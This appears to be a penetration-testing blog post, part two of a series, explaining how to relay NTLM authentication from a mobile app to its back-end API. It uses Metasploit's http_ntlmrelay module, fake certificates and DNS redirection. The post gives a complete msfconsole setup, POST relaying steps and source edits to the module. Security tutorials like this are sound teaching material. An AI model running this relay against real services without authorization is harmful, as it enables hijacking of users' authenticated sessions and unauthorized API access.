---
title:  "Hijacking NTLM-powered Mobile Apps (Part 2 - Relaying with Metasploit)"
date:   2018-10-01 12:00:00
published: true
---

Working on hacking a mobile app that uses NTLM to authenticate to a back-end web service? Make sure to check out [Part 1 - Cracking with Responder](/2018/ntlm-mobile-app-crack/) first. In this blog, we'll assume we could not crack the password and instead need to relay the Challenge/Response to interact with the API.

*Please note: This is an information security blog. Please don't do anything stupid without permission.*

## The setup

If you're reading this, I'm assuming you already read through part 1 and could not crack the password to clear-text. At this point, you should have the following steps completed:
- Validated you are indeed up against a 401 NTLM situation
- Fake certificate .pem file ready to go
- Your device has installed and trusted the fake CA that signed the client certificate
- You control the DNS for the device and have pointed your target domain to your computer

Having trouble figuring out the target domain and the target URL for the API? You should be able to see the first communication attempt from the mobile device inside Burp's "HTTP History" tab if you are proxied.

If you can't use Burp for some reason, try [my Python tool httpspy](https://github.com/initstring/pentest/blob/master/web-tools/httpspy.py) that listens for HTTP/HTTPS traffic and prints all details to the console. You would run it like this, assuming you followed Part 1 and used my certificate cloning tool as well:

```
sudo ./httpspy.py --cert ./clonessl-output/client.pem wlan0
```

Click around in the app and try to get it to speak with the web service. If everything is configured correctly, you should see some inbound traffic. I like to use httpspy as a sanity check to ensure my TLS certificate is working and trusted, DNS is routing properly, etc.

The screenshot below shows an example of a simulated mobile app speaking to httpspy. Note the lack of an Authorization header - this would likely be the same for an app that speaks to an NTLM protected web service. The header isn't sent until it is requested.

![1](/images/post-ntlm/httpspy1.png)

## The first relay
Rich Lundeen has contributed an amazing Metasploit module called [http_ntlmrelay](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/server/http_ntlmrelay.rb). We will use this to intercept inbound traffic like you saw above and initiate valid Challenge/Response conversations with the web service. This allows us to conduct any GET/POST requests we like, regardless of what the mobile app developer intended.

The commands below assume the following:
- Our mobile device is trying to communicate with https://mobileapi.com/webservice.asmx
- Mobileapi.com resolves to the actual public IP address of 8.8.8.8 (it doesn't, don't use that)
- Our computer has an IP address of 192.168.12.1 that is reachable by the mobile device
- You have added a DNS entry for mobileapi.com that points to 192.168.12.1 (as described in the previous blog post)
- You've caught the UserAgent for your mobile app and put it in place of 'VulnerableMobileApp' below

```
sudo msfconsole # we need root to bind to ports 80/443

 
use auxiliary/server/http_ntlmrelay
set RHOST 8.8.8.8
set RPORT 443
set RSSL true
set RURIPATH /webservice.asmx
set SRVHOST 192.168.12.1
set SRVPORT 443
set SSL true
set SSLCERT /opt/pentest/web-tools/clonessl-output/client.pem
set URIPATH /webservice.asmx
set VHOST mobileapi.com
set UserAgent VulnerableMobileApp
set VERBOSE true
```

The VERBOSE option is important. This will output our HTTP/S replies to the console, as opposed to just storing in the msfdb (which you might not even have set up).

Now, type `run` and hit enter. The next time you initiate a request from your mobile app, you should see some action on the console. Metasploit is going to relay a GET request to /webservice.asmx with a valid NTLM handshake. You can play around with that `RURIPATH` parameter to get other URLS, looking for something like a .wsdl file.

# Relaying POST actions

To really interact with the API, you probably need to do more than just GET requests. If you were lucky enough to find the API definitions, you might have enough to construct a valid POST request. If so, put the BODY (no headers) of your HTTP POST request in a file called `/tmp/post` and run the following commands inside msf:

```
kill <active job number>
set RTYPE HTTP_POST
set FILEPUTDATA /tmp/post
run
```

Notice we killed off the existing job first. You can use tab-tab to autocomplete the job number in msf. You'll have to kill and run every time you change the contents of that `/tmp/post` file, as it is loaded into memory at `run`.

When I observed my mobile app in httpspy, I saw the following header set: `Content-Type: text/xml`. I happened to be working with a SOAP API. The metasploit module won't automatically detect XML in your `/tmp/post` file and set the proper content type. If you check the advanced options of the module, you'll see there is a setting for a `HTTP_HEADERFILE`. This is meant for you to add your own headers. BUT IT DIDN'T WORK FOR ME. That option is not well documented, so perhaps I was doing it wrong.

Instead, I had to make the following change to the `/opt/metasploit-framework/modules/auxiliary/server/http_ntlmrelay.rb` file on my computer:

```
# Original file:
266:     theaders = ('Authorization: NTLM ' << hash << "\r\n" <<
267: "Connection: Keep-Alive\r\n" )

# My changes:
266:    theaders = ('Authorization: NTLM ' << hash << "\r\n" <<
267:          "Connection: Keep-Alive\r\nContent-Type: text/xml\r\n\r\n" )
```

For debugging purposes, I also like to add the following lines which will give you details on the incoming request you are attempting to relay:

```
# Original file:
300:  resp = ser_sock.send_recv(r, opts[:timeout] ? opts[:timeout] : timeout, true)

# My changes:
300:     resp = ser_sock.send_recv(r, opts[:timeout] ? opts[:timeout] : timeout, true)
301:     print_good("DEBUG:")
302:     print_good(opts.inspect)
```

Good luck and happy hacking!
